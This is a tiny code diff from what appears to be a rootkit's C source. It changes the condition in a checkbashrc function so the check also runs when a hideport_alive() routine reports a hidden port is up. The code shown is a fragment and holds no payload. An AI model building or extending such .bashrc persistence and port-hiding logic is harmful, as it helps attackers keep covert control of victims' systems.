@@ -43,7 +43,7 @@ int writebashrc(void){
 }
 
 void checkbashrc(void){
-    if(!rkprocup())
+    if(!rkprocup() && !hideport_alive())
         return;
 
     int statstat;
